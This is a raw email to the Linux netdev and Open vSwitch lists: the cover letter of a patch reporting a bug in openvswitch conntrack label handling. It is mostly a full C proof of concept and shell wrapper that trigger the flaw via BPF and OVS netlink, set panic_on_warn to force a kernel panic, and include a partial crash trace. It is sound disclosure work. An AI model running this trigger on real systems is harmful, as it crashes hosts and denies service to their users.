Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5964037FF60
	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 13:22:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789219378; cv=none; b=C0sitgi4jj0Zb6XFrFJAj4h0E1iUO5cLBLSsn+oCH+Rzfi+brlCyc2MGKtN7DaDFN7sW8uEctFjl9wsnlooiZ1EQPRw3OT4KV8Wt0mGCXji9MChV+KNxpm6ZhQm32TZMx5R68CH93+AFPiD5nfM2Nw/JZLnDUsT7HR1uBae7NTU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789219378; c=relaxed/simple;
	bh=UggiPW4k/kIjzP75Z5Ok969Zd/p/k3/3XhxG+Lq+ltY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=s3TusMH2+prjr1Y94aOh/729bx5Mjb6HUS5dSRLLM/LiTUcDmYNeW9fHSYFDQdQB53+LoVOKFIrtRaAbUTM54KjuzVqaPLa5RVvSgIRKydnnp4/dCmetcS+z9NITv846eKbWtsBuh/VHECEadhGF7REgHmWy6TIMF0kqmJ+dTZc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=cGJ8J/Z8; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="cGJ8J/Z8"
Received: by mail-pj2-f13.google.com with SMTP id d9443c01a7336-2d8fe517774so10440905ad.0
        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 06:22:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789219376; x=1789824176; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=7/8V1dcEDqd3dykDv42/CVl2IMl5AXU8LLMWGg38OkM=;
        b=cGJ8J/Z8Y4XxKkRa8v1m38fZhPTFSB7hmWtZKKxtK00u8gguhxKtHow/dL2diEhYCP
         q7VzE2nD77NkLLbbv7/dpxCi7tP4dkwlgOCTdEtAVOpnvLbFXczR7CFUt+bAjHaKsMEM
         4hP9f7HyZL+M/56O7G9DlN5fahmuBVFjqLg26iIjQrxLeZoI3kIXTOQElU8djmuAVXJH
         yR61Aa/941RHTBkiwFpZDK4fJeZ/XnHGoLABU2dmqsUxSzXPdqjhGYa5m7SnbP8O3lAq
         Cskzj+CdIHevmnPSoXVi8lxvOxCvU7b5hMddPwwM4bm8CezX1GvfBOLL3DW2+W3MUhVL
         tHlw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789219376; x=1789824176;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=7/8V1dcEDqd3dykDv42/CVl2IMl5AXU8LLMWGg38OkM=;
        b=B75UqNB6cFWbjyZofLVWv+8q0UTT6aqC+/TVf9TsfjFG8uQP0MUIuyT7IS4ybbIp49
         5IJYHdbFspKnpd4sMYufgWAntmJj/LSuDUEx6SIPuTBlrGWlfL4M/NUg7Bv0hC8zvLD/
         wO4SXHKsrhFLfnP0vHHAKfTNbfBEE5bcu5hhKLJLlISDgfMGLV4Gh8Y+En0M2Pj6ekki
         95xpCTqp/3ZThR2W4fnljKTg/M2NiOYcz4rR2k6qG5L+kq083O5YZP0zZhjkVve+kwXw
         NwEROU/tXtloBSxq3ZnNRsz5o6zPEtuHgykhnbGrH3q2rkot26ihYl/OVHVhmdCE9/lZ
         oUAw==
X-Gm-Message-State: AFuF++nHXtqwN6V6SaxN92zCQbkS7Go6tamftq6sFW8hiFeyqUdm4lTy
	td9NvHjg2vv6g5z35DsdI2nDw9tyzlU/lKXvmdcNfGU83sHnSO9MRkCK0UBe8WhNAPNDE5T+tfX
	Ok6tbeiDbTUc=
X-Gm-Gg: AYBFou3WQKpm6qvob1Zf2pGGU1F0sW+j/omEm5909X6NzDP2yfyEC5PDo1zcYtKeJuU
	MXXSoIoaHaFNX8EGkd58Of5Pfq6S1bxmkDgvhpryDFog8LNLMaAsLgLFNNcnF6vMPpeEGcnutGv
	h2/UFbsJAQiuEkmx8D/a/FkTEdG4JSlJtuXKHU/MtLNRUB0kqR8gs/Yvj4CWI22y8G1sPqHloMR
	s/MAw66WjJDjK4M5af/HgjQ5H8quaa/fWmpX9zoH52vZzzWv4kTJVBqedmA8o/f8i2KirlICXvn
	GpzruGrpk0aib6IsUMct29mukSZ/zk8LtBI9pq+ZESTuE3I4JrcEb4V97cYVGE/Na/8y/zrKydp
	tKZ3yiJWgUJtXV9cgU2PX8Hj/MYskImMQKdvhzqJloEb6y+nc702EpPexfJFvrWoypBTXVe6WOl
	l4GlxL+QVXc4cid9LqBkFkCWjA8gAvV0HpfE2g5ykpGIh8mP4Rjwt4JmifxQ8rj2Bhah+7UnQKn
	B1IyuE=
X-Received: by 2002:a17:902:ccc9:b0:2d7:3f6e:5cb9 with SMTP id d9443c01a7336-2dd2a1efc6amr165613105ad.8.1789219375403;
        Sat, 12 Sep 2026 06:22:55 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4b1f409sm15957666eec.0.2026.09.12.06.22.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 12 Sep 2026 06:22:54 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	dev@openvswitch.org
Cc: aconole@redhat.com,
	echaudro@redhat.com,
	i.maximets@ovn.org,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	pshelar@nicira.com,
	tgraf@suug.ch,
	joestringer@nicira.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] openvswitch: avoid reallocating confirmed conntrack labels
Date: Sat, 12 Sep 2026 21:22:42 +0800
Message-ID: <cover.1789218015.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/openvswitch/conntrack.c. The bug
is reachable by a root user through BPF and Open vSwitch netlink.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ovs_ct_get_conn_labels() first looks up the labels extension. If the
extension is missing, it calls nf_ct_labels_ext_add(), which wraps
nf_ct_ext_add(). That allocator warns when the conntrack is confirmed:

    WARN_ON(nf_ct_is_confirmed(ct));

The extension block is shared by packet-path readers after confirmation.
Reallocating it can free the old block while another CPU still holds a
pointer into it. The BPF kfunc path provides a deterministic way to
create the missing-extension state: bpf_skb_ct_alloc() followed by
bpf_ct_insert_entry() confirms the entry without allocating labels.

The userspace part creates an OVS datapath and sends
OVS_PACKET_CMD_EXECUTE with OVS_ACTION_ATTR_CT,
OVS_CT_ATTR_COMMIT, and OVS_CT_ATTR_LABELS for the same UDP tuple.
This reaches ovs_ct_set_labels() through ovs_ct_get_conn_labels().
The fix only adds the labels extension for unconfirmed conntracks.

Reproducer:

    gcc -O2 -g -Wall -o poc poc.c -lbpf -lelf -lz
    ./poc.sh lo

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    // SPDX-License-Identifier: GPL-2.0
    #include <arpa/inet.h>
    #include <bpf/bpf.h>
    #include <bpf/libbpf.h>
    #include <errno.h>
    #include <libgen.h>
    #include <linux/genetlink.h>
    #include <linux/if_ether.h>
    #include <linux/ip.h>
    #include <linux/netlink.h>
    #include <linux/openvswitch.h>
    #include <linux/udp.h>
    #include <net/if.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <unistd.h>

    #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
    #define MAX_NL_MSG 8192

    #define CTRL_CMD_GETFAMILY 3
    #define CTRL_ATTR_FAMILY_ID 1
    #define CTRL_ATTR_FAMILY_NAME 2

    #define OVS_DATAPATH_FAMILY "ovs_datapath"
    #define OVS_PACKET_FAMILY "ovs_packet"

    #define CT_SRC_IP "127.0.0.1"
    #define CT_DST_IP "127.0.0.1"
    #define CT_SRC_PORT 40000
    #define CT_DST_PORT 40001

    enum {
    	STATE_DONE = 0,
    	STATE_ERR = 1,
    };

    struct md_labels_user {
    	unsigned char value[OVS_CT_LABELS_LEN];
    	unsigned char mask[OVS_CT_LABELS_LEN];
    };

    static uint16_t ip_checksum(const void *buf, size_t len)
    {
    	const uint16_t *data = buf;
    	uint32_t sum = 0;

    	while (len > 1) {
    		sum += *data++;
    		len -= 2;
    	}

    	if (len)
    		sum += *(const uint8_t *)data;

    	while (sum >> 16)
    		sum = (sum & 0xffff) + (sum >> 16);

    	return (uint16_t)(~sum);
    }

    static bool nla_ok(const struct nlattr *nla, int rem)
    {
    	return rem >= (int)sizeof(*nla) && nla->nla_len >= sizeof(*nla) &&
    	       nla->nla_len <= rem;
    }

    static struct nlattr *nla_next(const struct nlattr *nla, int *rem)
    {
    	int totlen = NLA_ALIGN(nla->nla_len);

    	*rem -= totlen;
    	return (struct nlattr *)((char *)nla + totlen);
    }

    static void *nlmsg_tail(const struct nlmsghdr *nlh)
    {
    	return (void *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    }

    static struct nlattr *msg_put_attr(struct nlmsghdr *nlh, size_t maxlen,
    				   uint16_t type, const void *data,
    				   size_t data_len)
    {
    	size_t offset = NLMSG_ALIGN(nlh->nlmsg_len);
    	size_t attr_len = NLA_HDRLEN + data_len;
    	size_t total = NLA_ALIGN(attr_len);
    	struct nlattr *nla;

    	if (offset + total > maxlen)
    		return NULL;

    	nla = (struct nlattr *)((char *)nlh + offset);
    	nla->nla_type = type;
    	nla->nla_len = attr_len;
    	if (data_len && data)
    		memcpy((char *)nla + NLA_HDRLEN, data, data_len);
    	if (total > attr_len)
    		memset((char *)nla + attr_len, 0, total - attr_len);

    	nlh->nlmsg_len = offset + total;
    	return nla;
    }

    static struct nlattr *msg_put_flag(struct nlmsghdr *nlh, size_t maxlen,
    				   uint16_t type)
    {
    	return msg_put_attr(nlh, maxlen, type, NULL, 0);
    }

    static struct nlattr *msg_put_u32(struct nlmsghdr *nlh, size_t maxlen,
    				  uint16_t type, uint32_t value)
    {
    	return msg_put_attr(nlh, maxlen, type, &value, sizeof(value));
    }

    static struct nlattr *msg_put_string(struct nlmsghdr *nlh, size_t maxlen,
    				     uint16_t type, const char *value)
    {
    	return msg_put_attr(nlh, maxlen, type, value, strlen(value) + 1);
    }

    static struct nlattr *msg_nest_start(struct nlmsghdr *nlh, size_t maxlen,
    				     uint16_t type)
    {
    	return msg_put_attr(nlh, maxlen, type | NLA_F_NESTED, NULL, 0);
    }

    static void msg_nest_end(struct nlmsghdr *nlh, struct nlattr *start)
    {
    	start->nla_len = (char *)nlmsg_tail(nlh) - (char *)start;
    }

    static int nl_open(uint32_t *portid, int timeout_ms)
    {
    	struct sockaddr_nl addr = {
    		.nl_family = AF_NETLINK,
    	};
    	struct timeval tv;
    	socklen_t len = sizeof(addr);
    	int fd;

    	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    	if (fd < 0)
    		return -errno;

    	tv.tv_sec = timeout_ms / 1000;
    	tv.tv_usec = (timeout_ms % 1000) * 1000;
    	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    		close(fd);
    		return -errno;
    	}

    	if (getsockname(fd, (struct sockaddr *)&addr, &len) < 0) {
    		close(fd);
    		return -errno;
    	}

    	*portid = addr.nl_pid;
    	return fd;
    }

    static int nl_transact(int fd, struct nlmsghdr *req, char *resp,
    		       size_t resp_size, ssize_t *resp_len, bool want_payload)
    {
    	struct sockaddr_nl nladdr = {
    		.nl_family = AF_NETLINK,
    	};
    	struct iovec iov = {
    		.iov_base = req,
    		.iov_len = req->nlmsg_len,
    	};
    	struct msghdr msg = {
    		.msg_name = &nladdr,
    		.msg_namelen = sizeof(nladdr),
    		.msg_iov = &iov,
    		.msg_iovlen = 1,
    	};
    	uint32_t seq = req->nlmsg_seq;

    	if (sendmsg(fd, &msg, 0) < 0)
    		return -errno;

    	for (;;) {
    		ssize_t len = recv(fd, resp, resp_size, 0);
    		struct nlmsghdr *nlh;

    		if (len < 0)
    			return -errno;

    		for (nlh = (struct nlmsghdr *)resp; NLMSG_OK(nlh, len);
    		     nlh = NLMSG_NEXT(nlh, len)) {
    			if (nlh->nlmsg_seq != seq)
    				continue;

    			if (nlh->nlmsg_type == NLMSG_ERROR) {
    				struct nlmsgerr *err = NLMSG_DATA(nlh);

    				if (err->error)
    					return err->error;
    				if (!want_payload) {
    					if (resp_len)
    						*resp_len = 0;
    					return 0;
    				}
    				continue;
    			}

    			if (resp_len)
    				*resp_len = nlh->nlmsg_len;
    			return 0;
    		}
    	}
    }

    static int resolve_family_id(int fd, uint32_t *seq, const char *name)
    {
    	char reqbuf[MAX_NL_MSG];
    	char respbuf[MAX_NL_MSG];
    	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
    	struct genlmsghdr *genl;
    	ssize_t resp_len = 0;
    	struct nlmsghdr *rnlh;
    	struct genlmsghdr *rgenl;
    	struct nlattr *attr;
    	int rem;
    	int err;

    	memset(reqbuf, 0, sizeof(reqbuf));
    	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
    	nlh->nlmsg_type = GENL_ID_CTRL;
    	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    	nlh->nlmsg_seq = ++(*seq);
    	genl = NLMSG_DATA(nlh);
    	genl->cmd = CTRL_CMD_GETFAMILY;
    	genl->version = 1;

    	if (!msg_put_string(nlh, sizeof(reqbuf), CTRL_ATTR_FAMILY_NAME, name))
    		return -EMSGSIZE;

    	err = nl_transact(fd, nlh, respbuf, sizeof(respbuf), &resp_len, true);
    	if (err)
    		return err;

    	rnlh = (struct nlmsghdr *)respbuf;
    	if (resp_len <= 0 || rnlh->nlmsg_type == NLMSG_ERROR)
    		return -ENOENT;

    	rgenl = NLMSG_DATA(rnlh);
    	attr = (struct nlattr *)((char *)rgenl + GENL_HDRLEN);
    	rem = rnlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);

    	for (; nla_ok(attr, rem); attr = nla_next(attr, &rem)) {
    		if (attr->nla_type == CTRL_ATTR_FAMILY_ID)
    			return *(uint16_t *)((char *)attr + NLA_HDRLEN);
    	}

    	return -ENOENT;
    }

    static int create_datapath(int fd, uint32_t *seq, uint16_t dp_family,
    			   const char *name)
    {
    	char reqbuf[MAX_NL_MSG];
    	char respbuf[MAX_NL_MSG];
    	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
    	struct genlmsghdr *genl;
    	struct ovs_header *ovsh;
    	ssize_t resp_len = 0;
    	struct nlmsghdr *rnlh;
    	int err;
    	int tries;

    	memset(reqbuf, 0, sizeof(reqbuf));
    	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN + sizeof(*ovsh));
    	nlh->nlmsg_type = dp_family;
    	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    	nlh->nlmsg_seq = ++(*seq);
    	genl = NLMSG_DATA(nlh);
    	genl->cmd = OVS_DP_CMD_NEW;
    	genl->version = OVS_DATAPATH_VERSION;
    	ovsh = (struct ovs_header *)((char *)genl + GENL_HDRLEN);

    	if (!msg_put_string(nlh, sizeof(reqbuf), OVS_DP_ATTR_NAME, name) ||
    	    !msg_put_u32(nlh, sizeof(reqbuf), OVS_DP_ATTR_UPCALL_PID, 0))
    		return -EMSGSIZE;

    	err = nl_transact(fd, nlh, respbuf, sizeof(respbuf), &resp_len, true);
    	if (err && err != -EAGAIN && err != -EEXIST)
    		return err;

    	if (resp_len > 0) {
    		rnlh = (struct nlmsghdr *)respbuf;
    		if (rnlh->nlmsg_len >= NLMSG_LENGTH(GENL_HDRLEN + sizeof(*ovsh))) {
    			struct genlmsghdr *rgenl = NLMSG_DATA(rnlh);
    			struct ovs_header *rovsh =
    				(struct ovs_header *)((char *)rgenl + GENL_HDRLEN);

    			if (rovsh->dp_ifindex)
    				return (int)rovsh->dp_ifindex;
    		}
    	}

    	for (tries = 0; tries < 50; tries++) {
    		unsigned int ifindex = if_nametoindex(name);

    		if (ifindex)
    			return (int)ifindex;
    		usleep(20000);
    	}

    	return -ENOENT;
    }

    static void delete_datapath(int fd, uint32_t *seq, uint16_t dp_family,
    			    const char *name, int dp_ifindex)
    {
    	char reqbuf[MAX_NL_MSG];
    	char respbuf[MAX_NL_MSG];
    	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
    	struct genlmsghdr *genl;
    	struct ovs_header *ovsh;
    	ssize_t resp_len;

    	memset(reqbuf, 0, sizeof(reqbuf));
    	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN + sizeof(*ovsh));
    	nlh->nlmsg_type = dp_family;
    	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    	nlh->nlmsg_seq = ++(*seq);
    	genl = NLMSG_DATA(nlh);
    	genl->cmd = OVS_DP_CMD_DEL;
    	genl->version = OVS_DATAPATH_VERSION;
    	ovsh = (struct ovs_header *)((char *)genl + GENL_HDRLEN);
    	ovsh->dp_ifindex = dp_ifindex;
    	msg_put_string(nlh, sizeof(reqbuf), OVS_DP_ATTR_NAME, name);
    	nl_transact(fd, nlh, respbuf, sizeof(respbuf), &resp_len, false);
    }

    static size_t build_udp_packet(uint8_t *buf, size_t buf_size)
    {
    	struct ethhdr *eth = (struct ethhdr *)buf;
    	struct iphdr *ip;
    	struct udphdr *udp;
    	uint8_t *payload;
    	size_t payload_len = 8;
    	size_t need = sizeof(*eth) + sizeof(*ip) + sizeof(*udp) + payload_len;

    	if (buf_size < need)
    		return 0;

    	memset(buf, 0, need);
    	eth->h_dest[0] = 0x02;
    	eth->h_dest[5] = 0x02;
    	eth->h_source[0] = 0x02;
    	eth->h_source[5] = 0x01;
    	eth->h_proto = htons(ETH_P_IP);

    	ip = (struct iphdr *)(buf + sizeof(*eth));
    	ip->version = 4;
    	ip->ihl = 5;
    	ip->tot_len = htons(sizeof(*ip) + sizeof(*udp) + payload_len);
    	ip->id = htons(0x4242);
    	ip->ttl = 64;
    	ip->protocol = IPPROTO_UDP;
    	ip->saddr = inet_addr(CT_SRC_IP);
    	ip->daddr = inet_addr(CT_DST_IP);
    	ip->check = ip_checksum(ip, sizeof(*ip));

    	udp = (struct udphdr *)((char *)ip + sizeof(*ip));
    	udp->source = htons(CT_SRC_PORT);
    	udp->dest = htons(CT_DST_PORT);
    	udp->len = htons(sizeof(*udp) + payload_len);

    	payload = (uint8_t *)udp + sizeof(*udp);
    	memcpy(payload, "R7KTRACE", payload_len);
    	return need;
    }

    static int execute_ovs_trigger(int fd, uint32_t *seq, uint16_t packet_family,
    			       int dp_ifindex)
    {
    	uint8_t packet[256];
    	char reqbuf[MAX_NL_MSG];
    	char respbuf[MAX_NL_MSG];
    	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
    	struct genlmsghdr *genl;
    	struct ovs_header *ovsh;
    	struct nlattr *key_start;
    	struct nlattr *actions_start;
    	struct nlattr *ct_start;
    	struct md_labels_user labels = {0};
    	size_t packet_len;

    	labels.value[0] = 0x41;
    	labels.mask[0] = 0xff;

    	packet_len = build_udp_packet(packet, sizeof(packet));
    	if (!packet_len)
    		return -EMSGSIZE;

    	memset(reqbuf, 0, sizeof(reqbuf));
    	nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN + sizeof(*ovsh));
    	nlh->nlmsg_type = packet_family;
    	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    	nlh->nlmsg_seq = ++(*seq);
    	genl = NLMSG_DATA(nlh);
    	genl->cmd = OVS_PACKET_CMD_EXECUTE;
    	genl->version = OVS_PACKET_VERSION;
    	ovsh = (struct ovs_header *)((char *)genl + GENL_HDRLEN);
    	ovsh->dp_ifindex = dp_ifindex;

    	if (!msg_put_attr(nlh, sizeof(reqbuf), OVS_PACKET_ATTR_PACKET,
    			  packet, packet_len))
    		return -EMSGSIZE;

    	key_start = msg_nest_start(nlh, sizeof(reqbuf), OVS_PACKET_ATTR_KEY);
    	if (!key_start)
    		return -EMSGSIZE;
    	msg_nest_end(nlh, key_start);

    	actions_start = msg_nest_start(nlh, sizeof(reqbuf),
    				       OVS_PACKET_ATTR_ACTIONS);
    	if (!actions_start)
    		return -EMSGSIZE;

    	ct_start = msg_nest_start(nlh, sizeof(reqbuf), OVS_ACTION_ATTR_CT);
    	if (!ct_start ||
    	    !msg_put_flag(nlh, sizeof(reqbuf), OVS_CT_ATTR_COMMIT) ||
    	    !msg_put_attr(nlh, sizeof(reqbuf), OVS_CT_ATTR_LABELS,
    			  &labels, sizeof(labels)))
    		return -EMSGSIZE;

    	msg_nest_end(nlh, ct_start);
    	msg_nest_end(nlh, actions_start);

    	return nl_transact(fd, nlh, respbuf, sizeof(respbuf), NULL, false);
    }

    static int set_panic_on_warn(void)
    {
    	FILE *fp = fopen("/proc/sys/kernel/panic_on_warn", "w");

    	if (!fp)
    		return -errno;
    	if (fprintf(fp, "1\n") < 0) {
    		int err = -errno;

    		fclose(fp);
    		return err;
    	}
    	fclose(fp);
    	return 0;
    }

    static int chdir_to_path_dir(const char *path)
    {
    	char *copy, *dir;
    	int ret;

    	copy = strdup(path);
    	if (!copy)
    		return -ENOMEM;
    	dir = dirname(copy);
    	ret = chdir(dir) == 0 ? 0 : -errno;
    	free(copy);
    	return ret;
    }

    static int trigger_bpf_once(int ifindex)
    {
    	LIBBPF_OPTS(bpf_tc_hook, hook, .attach_point = BPF_TC_INGRESS);
    	LIBBPF_OPTS(bpf_tc_opts, attach_opts, .handle = 1, .priority = 1);
    	struct sockaddr_in addr = {
    		.sin_family = AF_INET,
    		.sin_port = htons(9),
    		.sin_addr = { .s_addr = htonl(INADDR_LOOPBACK) },
    	};
    	struct bpf_program *prog;
    	struct bpf_object *obj = NULL;
    	int map_fd, sock = -1;
    	uint64_t done = 0, err_code = 0;
    	uint32_t key;
    	int err;

    	obj = bpf_object__open_file("./poc.bpf.o", NULL);
    	if (!obj)
    		return -EINVAL;
    	err = bpf_object__load(obj);
    	if (err) {
    		err = -err;
    		goto out;
    	}

    	prog = bpf_object__find_program_by_name(obj, "insert_unlabeled_ct");
    	if (!prog) {
    		err = -ENOENT;
    		goto out;
    	}

    	map_fd = bpf_object__find_map_fd_by_name(obj, "state");
    	if (map_fd < 0) {
    		err = map_fd;
    		goto out;
    	}

    	hook.ifindex = ifindex;
    	err = bpf_tc_hook_create(&hook);
    	if (err && err != -EEXIST) {
    		err = -err;
    		goto out;
    	}

    	attach_opts.prog_fd = bpf_program__fd(prog);
    	err = bpf_tc_attach(&hook, &attach_opts);
    	if (err) {
    		err = -err;
    		goto destroy_hook;
    	}

    	sock = socket(AF_INET, SOCK_DGRAM, 0);
    	if (sock < 0) {
    		err = -errno;
    		goto detach;
    	}

    	if (sendto(sock, "x", 1, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    		err = -errno;
    		goto detach;
    	}

    	for (int i = 0; i < 50; i++) {
    		key = STATE_DONE;
    		if (!bpf_map_lookup_elem(map_fd, &key, &done) && done)
    			break;
    		usleep(20000);
    	}

    	key = STATE_ERR;
    	bpf_map_lookup_elem(map_fd, &key, &err_code);
    	if (!done) {
    		err = err_code ? -(int)err_code : -ETIMEDOUT;
    		goto detach;
    	}

    	err = 0;

    detach:
    	if (sock >= 0)
    		close(sock);
    	bpf_tc_detach(&hook, &attach_opts);
    destroy_hook:
    	bpf_tc_hook_destroy(&hook);
    out:
    	bpf_object__close(obj);
    	return err;
    }

    int main(int argc, char **argv)
    {
    	const char *obj_path = argc > 1 ? argv[1] : "./poc.bpf.o";
    	const char *ifname = argc > 2 ? argv[2] : "lo";
    	char dp_name[IFNAMSIZ];
    	uint32_t seq = 0;
    	int fd = -1;
    	int ifindex;
    	int dp_family;
    	int packet_family;
    	int dp_ifindex = 0;
    	bool skip_panic_on_warn = false;
    	int err;

    	for (int i = 3; i < argc; i++) {
    		if (!strcmp(argv[i], "--skip-panic-on-warn"))
    			skip_panic_on_warn = true;
    	}

    	err = chdir_to_path_dir(obj_path);
    	if (err) {
    		fprintf(stderr, "chdir failed: %s\n", strerror(-err));
    		return 1;
    	}

    	ifindex = if_nametoindex(ifname);
    	if (!ifindex) {
    		fprintf(stderr, "unknown interface %s\n", ifname);
    		return 1;
    	}

    	if (!skip_panic_on_warn) {
    		err = set_panic_on_warn();
    		if (err) {
    			fprintf(stderr, "failed to set panic_on_warn: %s\n",
    				strerror(-err));
    			return 1;
    		}
    	}

    	err = trigger_bpf_once(ifindex);
    	if (err) {
    		fprintf(stderr, "failed to insert unlabeled conntrack: %s (%d)\n",
    			strerror(-err), err);
    		return 1;
    	}
    	printf("[+] inserted confirmed conntrack via BPF without labels\n");

    	fd = nl_open(&(uint32_t){0}, 2000);
    	if (fd < 0) {
    		fprintf(stderr, "netlink open failed: %s\n", strerror(-fd));
    		return 1;
    	}

    	dp_family = resolve_family_id(fd, &seq, OVS_DATAPATH_FAMILY);
    	packet_family = resolve_family_id(fd, &seq, OVS_PACKET_FAMILY);
    	if (dp_family < 0 || packet_family < 0) {
    		fprintf(stderr, "failed to resolve OVS families\n");
    		close(fd);
    		return 1;
    	}

    	snprintf(dp_name, sizeof(dp_name), "r7kdp%d", getpid());
    	dp_ifindex = create_datapath(fd, &seq, dp_family, dp_name);
    	if (dp_ifindex < 0) {
    		fprintf(stderr, "failed to create datapath: %s (%d)\n",
    			strerror(-dp_ifindex), dp_ifindex);
    		close(fd);
    		return 1;
    	}

    	printf("[+] datapath ifindex=%d\n", dp_ifindex);
    	printf("[+] triggering OVS ct(commit+labels) on %s:%d -> %s:%d\n",
    	       CT_SRC_IP, CT_SRC_PORT, CT_DST_IP, CT_DST_PORT);
    	fflush(stdout);

    	err = execute_ovs_trigger(fd, &seq, packet_family, dp_ifindex);
    	if (!err) {
    		fprintf(stderr, "trigger returned without crash\n");
    		delete_datapath(fd, &seq, dp_family, dp_name, dp_ifindex);
    		close(fd);
    		return 1;
    	}

    	fprintf(stderr, "OVS execute returned error: %s (%d)\n",
    		strerror(-err), err);
    	delete_datapath(fd, &seq, dp_family, dp_name, dp_ifindex);
    	close(fd);
    	return 1;
    }

------END poc.c--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    IFACE=${1:-lo}
    shift $(( $# > 0 ? 1 : 0 ))

    if [ ! -f "$DIR/poc.bpf.o" ]; then
    	echo "missing $DIR/poc.bpf.o; build it with 'make -C $DIR'" >&2
    	exit 1
    fi

    if [ ! -x "$DIR/poc" ]; then
    	gcc -O2 -g -Wall -o "$DIR/poc" "$DIR/poc.c" -lbpf -lelf -lz
    fi

    exec "$DIR/poc" "$DIR/poc.bpf.o" "$IFACE" "$@"

------END poc.sh--------

----BEGIN crash log----

[  479.496162][ T9977] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  479.497304][ T9977] CPU: 3 UID: 0 PID: 9977 Comm: poc Not tainted 7.1.0-rc1 #2 PREEMPT(full) 
[  479.498462][ T9977] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  479.499883][ T9977] Call Trace:
[  479.500359][ T9977]  <TASK>
[  479.500852][ T9977]  vpanic+0x6c3/0x790
[  479.501540][ T9977]  ? __pfx_vpanic+0x10/0x10
[  479.502308][ T9977]  ? nf_ct_ext_add+0x2f2/0x420
[  479.503087][ T9977]  panic+0xca/0xd0
[  479.503724][ T9977]  ? __pfx_panic+0x10/0x10
[  479.504488][ T9977]  check_panic_on_warn+0x61/0x80
[  479.505336][ T9977]  __warn+0xe8/0x330
[  479.505992][ T9977]  ? nf_ct_ext_add+0x2f2/0x420
[  479.506776][ T9977]  __report_bug+0x361/0x460
[  479.507548][ T9977]  ? __pfx___report_bug+0x10/0x10
[  479.508412][ T9977]  ? __ovs_ct_lookup+0x1625/0x2a90
